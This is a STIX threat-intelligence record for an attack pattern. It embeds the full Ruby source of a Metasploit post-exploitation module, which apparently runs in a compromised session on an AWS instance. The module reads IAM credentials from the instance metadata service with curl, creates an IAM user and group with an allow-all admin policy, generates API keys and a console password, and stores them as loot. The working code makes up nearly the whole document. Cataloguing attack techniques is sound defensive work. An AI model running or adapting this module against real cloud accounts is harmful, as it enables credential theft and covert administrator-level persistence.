{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4111fee9-2f22-4beb-a674-07b562e79982",
    "created": "2024-08-14T16:33:17.993912Z",
    "modified": "2024-08-14T16:33:17.993916Z",
    "name": "Create an AWS IAM User",
    "description": " This module will attempt to create an AWS (Amazon Web Services) IAM (Identity and Access Management) user with Admin privileges.  'License' => MSF_LICENSE 'Platform' => %w[unix] 'SessionTypes' => %w[shell meterpreter]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/escalate/aws_create_iam_user.rb",
            "external_id": "aws_create_iam_user.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/aws/client'\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Metasploit::Framework::Aws::Client\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Create an AWS IAM User',\n        'Description' => %q{\n          This module will attempt to create an AWS (Amazon Web Services) IAM\n          (Identity and Access Management) user with Admin privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => %w[unix],\n        'SessionTypes' => %w[shell meterpreter],\n        'Author' => [\n          'Javier Godinez <godinezj[at]gmail.com>',\n          'Jon Hart <jon_hart@rapid7.com>'\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),\n        OptString.new('IAM_PASSWORD', [false, 'Password to set for the user to be created (leave empty or unset to use a random name)', '']),\n        OptString.new('IAM_GROUPNAME', [false, 'Name of the group to be created (leave empty or unset to use a random name)', '']),\n        OptBool.new('CREATE_API', [true, 'Add access key ID and secret access key to account (API, CLI, and SDK access)', true]),\n        OptBool.new('CREATE_CONSOLE', [true, 'Create an account with a password for accessing the AWS management console', true]),\n        OptString.new('AccessKeyId', [false, 'AWS access key', '']),\n        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),\n        OptString.new('Token', [false, 'AWS session token', ''])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),\n        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),\n        OptPort.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),\n        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),\n        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" }]}']),\n        OptString.new('Region', [true, 'The default region', 'us-east-1' ])\n      ]\n    )\n    deregister_options('VHOST')\n  end\n\n  def setup\n    if !(datastore['CREATE_API'] || datastore['CREATE_CONSOLE'])\n      fail_with(Failure::BadConfig, 'Must set one or both of CREATE_API and CREATE_CONSOLE')\n    end\n  end\n\n  def run\n    # setup creds for making IAM API calls\n    creds = metadata_creds\n    if datastore['AccessKeyId'].empty?\n      unless creds.include?('AccessKeyId')\n        print_error('Could not find creds')\n        return\n      end\n    else\n      creds = {\n        'AccessKeyId' => datastore['AccessKeyId'],\n        'SecretAccessKey' => datastore['SecretAccessKey']\n      }\n      creds['Token'] = datastore['Token'] unless datastore['Token'].blank?\n    end\n\n    results = {}\n\n    # create user\n    username = datastore['IAM_USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']\n    print_status(\"Creating user: #{username}\")\n    action = 'CreateUser'\n    doc = call_iam(creds, 'Action' => action, 'UserName' => username)\n    print_results(doc, action)\n    results['UserName'] = username\n\n    # create group\n    groupname = datastore['IAM_GROUPNAME'].blank? ? username : datastore['IAM_GROUPNAME']\n    print_status(\"Creating group: #{groupname}\")\n    action = 'CreateGroup'\n    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname)\n    print_results(doc, action)\n    results['GroupName'] = groupname\n\n    # create group policy\n    print_status('Creating group policy')\n    pol_doc = datastore['IAM_GROUP_POL']\n    action = 'PutGroupPolicy'\n    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => 'Policy', 'PolicyDocument' => URI::DEFAULT_PARSER.escape(pol_doc))\n    print_results(doc, action)\n\n    # add user to group\n    print_status(\"Adding user (#{username}) to group: #{groupname}\")\n    action = 'AddUserToGroup'\n    doc = call_iam(creds, 'Action' => action, 'UserName' => username, 'GroupName' => groupname)\n    print_results(doc, action)\n\n    if datastore['CREATE_API']\n      # create API keys\n      print_status(\"Creating API Keys for #{username}\")\n      action = 'CreateAccessKey'\n      response = call_iam(creds, 'Action' => action, 'UserName' => username)\n      doc = print_results(response, action)\n      if doc\n        results['SecretAccessKey'] = doc['SecretAccessKey']\n        results['AccessKeyId'] = doc['AccessKeyId']\n      end\n    end\n\n    if datastore['CREATE_CONSOLE']\n      print_status(\"Creating password for #{username}\")\n      password = datastore['IAM_PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_PASSWORD']\n      action = 'CreateLoginProfile'\n      response = call_iam(creds, 'Action' => action, 'UserName' => username, 'Password' => password)\n      doc = print_results(response, action)\n      results['Password'] = password if doc\n    end\n\n    action = 'GetUser'\n    response = call_iam(creds, 'Action' => action, 'UserName' => username)\n    doc = print_results(response, action)\n    return if doc.nil?\n\n    arn = doc['Arn']\n    results['AccountId'] = arn[/^arn:aws:iam::(\\d+):/, 1]\n\n    keys = results.keys\n    table = Rex::Text::Table.new(\n      'Header' => 'AWS Account Information',\n      'Columns' => keys\n    )\n    table << results.values\n    print_line(table.to_s)\n\n    if results.key?('AccessKeyId')\n      print_good('AWS CLI/SDK etc can be accessed by configuring with the above listed values')\n    end\n\n    if results.key?('Password')\n      print_good(\"AWS console URL https://#{results['AccountId']}.signin.aws.amazon.com/console may be used to access this account\")\n    end\n\n    path = store_loot('AWS credentials', 'text/plain', session, JSON.pretty_generate(results))\n    print_good('AWS loot stored at: ' + path)\n  end\n\n  def metadata_creds\n    # TODO: do it for windows/generic way\n    cmd_out = cmd_exec('curl --version')\n    if cmd_out =~ /^curl \\d/\n      url = \"http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/\"\n      print_status(\"#{datastore['METADATA_IP']} - looking for creds...\")\n      resp = cmd_exec(\"curl #{url}\")\n      if resp =~ /^iam.*/\n        resp = cmd_exec(\"curl #{url}iam/\")\n        if resp =~ /^security-credentials.*/\n          resp = cmd_exec(\"curl #{url}iam/security-credentials/\")\n          json_out = cmd_exec(\"curl #{url}iam/security-credentials/#{resp}\")\n          begin\n            return JSON.parse(json_out)\n          rescue JSON::ParserError\n            print_error 'Could not parse JSON output'\n          end\n        end\n      end\n    else\n      print_error cmd_out\n    end\n    {}\n  end\nend\n"
}